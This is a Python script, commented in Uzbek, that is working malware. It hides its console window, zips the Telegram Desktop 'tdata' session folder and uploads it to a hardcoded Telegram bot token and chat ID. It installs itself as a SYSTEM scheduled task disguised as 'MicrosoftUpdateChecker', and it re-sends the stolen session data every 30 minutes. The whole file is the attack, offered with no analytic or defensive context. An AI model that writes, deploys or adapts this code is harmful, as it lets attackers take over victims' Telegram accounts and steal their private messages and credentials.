import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json, subprocess, winreg

# 1. O'z-o'zini ishga tushirish (Internetdan kelsa)
if len(sys.argv) > 0 and "http" in sys.argv[0]:
    try:
        exec(urllib.request.urlopen(sys.argv[0]).read())
        sys.exit()
    except:
        pass

# 2. Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# 3. Telegram ma'lumotlari
BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_telegram_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

# 4. tdata ni yig'ish va yuborish
def zip_and_send():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    
    if os.path.exists(tdata_path):
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                        except: pass
            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
            os.remove(zip_path)
            return True
        except:
            pass
    return False

# 5. O'zini Task Scheduler ga o'rnatish (Doimiy qilish)
def install_persistence():
    try:
        # 5.1. O'zini kompyuterga saqlash
        script_path = os.path.join(os.environ['APPDATA'], "msvc_update.py")
        
        # Agar fayl internetdan kelsa, uni kompyuterga yuklab olamiz
        if not os.path.exists(script_path):
            content = urllib.request.urlopen(sys.argv[0]).read().decode()
            with open(script_path, 'w') as f:
                f.write(content)
            os.chmod(script_path, 0o777)
        
        # 5.2. Task Scheduler ga qo'shish (Har bir foydalanuvchi kirganda)
        task_name = "MicrosoftUpdateChecker"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        send_telegram_message(f"♻️ Checker kompyuterga o'rnatildi: {socket.gethostname()}")
        return True
    except Exception as e:
        return False

# 6. Asosiy ishchi funksiya
def main():
    pc_name = socket.gethostname()
    
    # Birinchi marta ishga tushganda, o'zini o'rnatadi
    if not os.path.exists(os.path.join(os.environ['APPDATA'], "msvc_update.py")):
        if install_persistence():
            send_telegram_message(f"🟢 Checker birinchi marta ishga tushdi: {pc_name}")
    
    # Hozirgi tdata ni yuborish
    zip_and_send()
    
    # Endi doimiy ishlash (kuzatish)
    last_sent = 0
    while True:
        time.sleep(60) # Har 1 daqiqada tekshiradi
        
        # Agar Telegram Desktop ishlayotgan bo'lsa
        try:
            result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
            if "Telegram.exe" in result.stdout:
                if time.time() - last_sent > 1800: # Har 30 daqiqada qayta yuboradi
                    if zip_and_send():
                        last_sent = time.time()
        except:
            pass

if __name__ == "__main__":
    main()
